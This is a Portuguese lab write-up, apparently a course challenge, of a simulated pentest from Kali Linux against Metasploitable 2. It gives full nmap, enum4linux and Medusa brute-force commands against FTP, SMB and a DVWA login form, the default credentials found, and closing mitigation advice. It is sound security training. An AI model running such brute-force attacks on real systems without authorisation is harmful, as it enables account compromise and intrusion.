# Desafio DIO: Auditoria de Segurança com Kali Linux e Medusa

Este repositório documenta a execução prática de testes de intrusão simulados utilizando **Kali Linux** e a ferramenta **Medusa** contra a máquina alvo vulnerável **Metasploitable 2**. O objetivo principal é exercitar técnicas de varredura, enumeração, força bruta em múltiplos serviços e propor medidas de mitigação adequadas.

---

## 🛠️ 1. Configuração do Ambiente Controlado

O ambiente foi montado utilizando o **Oracle VirtualBox**, isolando os sistemas em uma rede interna/host-only para garantir a segurança dos testes.

*   **Máquina de Ataque:** Kali Linux (`kali-linux-2026.3-virtualbox-amd64`)
*   **Máquina Alvo:** Metasploitable 2 (`Metasploitable.vmdk`)
*   **Snapshot de Segurança:** Foi criado um ponto de restauração (*Snapshot*) chamado `configuracaoinicial` na máquina alvo para garantir a integridade do laboratório.
*   **Identificação do IP Alvo:** Através do comando `ip a` executado diretamente no terminal do Metasploitable, identificou-se o endereço IP fixado na interface `eth0`: **`192.168.56.101`**.

---

## 🔍 2. Reconhecimento Avançado e Enumeração

Para mapear a superfície de ataque e descobrir quais serviços e informações estavam expostos no alvo, realizaram-se varreduras a partir do terminal do Kali Linux.

### Varredura de Portas e Serviços (Nmap)
```bash
ping -c 3 192.168.56.101
nmap -sV -p 21,22,80,445,139 192.168.56.101
```
*Serviços essenciais identificados:*
*   **Porta 21/tcp:** FTP (`vsftpd 2.3.4`)
*   **Porta 80/tcp:** HTTP (`Apache httpd 2.2.8`)
*   **Portas 139 e 445/tcp:** NetBIOS/SMB (`Samba smbd 3.X`)

### Enumeração de Usuários e Domínio (enum4linux)
```bash
enum4linux -a 192.168.56.101
```
*   **Informações Coletadas:**
    *   **Grupo de Trabalho/Domínio:** `WORKGROUP`
    *   **Nome NetBIOS da Máquina:** `METASPLOITABLE`
    *   **Status dos Serviços:** Identificação ativa de papéis como `Workstation` e `File Server`.

---

## 📋 3. Criação de Dicionários Personalizados (Wordlists)

Utilizando comandos estruturados de terminal, foram criados arquivos de texto contendo combinações comuns de usuários e senhas para alimentar os testes automatizados:

```bash
# Criação de listas gerais e para o SMB
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
echo -e '123456\npassword\nnqwerty\nmsfadmin' > pass.txt

echo -e 'user\nmsfadmin\nnservice' > smb_users.txt
echo -e 'password\n123456\nWelcom123\nmsfadmin' > senhas_spray.txt
```

---

## ⚔️ 4. Execução dos Ataques de Força Bruta e Resultados

### Cenário A: Força Bruta e Validação via FTP
O Medusa foi configurado para testar combinações contra a porta 21:
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp
```
*   **Resultado:** A ferramenta encontrou a credencial válida para o sistema: `msfadmin / msfadmin [SUCCESS]`.
*   **Validação de Acesso:** O acesso foi verificado manualmente via terminal autenticando-se com sucesso no servidor FTP remoto (`230 Login successful`).

### Cenário B: Auditoria de Credenciais no SMB (Samba)
Para simular um ataque focado na infraestrutura de rede local e compartilhamentos, utilizamos o módulo `smbnt`:
```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```
*   **Resultado:** Sucesso na quebra de autenticação com acesso liberado:
    *   **Credencial Identificada:** `msfadmin / msfadmin`
    *   **Mensagem do Sistema:** `SUCCESS (ADMIN$ - Access Allowed)`
*   **Enumeração de Compartilhamento:** Invocando o utilitário `smbclient` com a credencial descoberta, mapeou-se os diretórios expostos na rede (como `print$`, `tmp`, `opt`, `IPC$`, `ADMIN$` e o diretório home do usuário).

### Cenário C: Automação Web via HTTP (Formulário DVWA)
Para testar a segurança do portal web do Damn Vulnerable Web Application (DVWA), executou-se a sintaxe modular contra o formulário de login:
```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m FAIL:'Login failed' -t 60
```
*   **Resultado:** A ferramenta descobriu múltiplas combinações vulneráveis configuradas no ambiente (como `admin / 123456 [SUCCESS]` e `msfadmin / msfadmin [SUCCESS]`).
*   **Validação do Acesso:** Autenticação realizada com sucesso no painel administrativo principal do DVWA através do navegador.

---

## 🛡️ 5. Recomendações de Mitigação e Defesa

Com base nas vulnerabilidades e facilidades encontradas durante as simulações, as seguintes contramedidas de segurança são recomendadas:

1.  **Políticas Rígidas de Credenciais:** Desativar completamente usuários padrões de fábrica (como `msfadmin`), remover credenciais fracas pré-configuradas e impor políticas que exijam senhas longas e complexas.
2.  **Bloqueio de Contas (Account Lockout):** Configurar mecanismos no sistema operacional, serviços de rede (SSH, FTP, SMB) e aplicações web que suspendam temporariamente o login de usuários após sucessivas tentativas incorretas, inviabilizando ataques automatizados como os do Medusa.
3.  **Implementação de Mecanismos de Proteção Ativa:** Adotar soluções de monitoramento e detecção como o **Fail2ban** para analisar logs de autenticação em tempo real e banir temporariamente no Firewall do servidor os endereços IP que demonstrem padrões de varreduras agressivas ou ataques de força bruta.

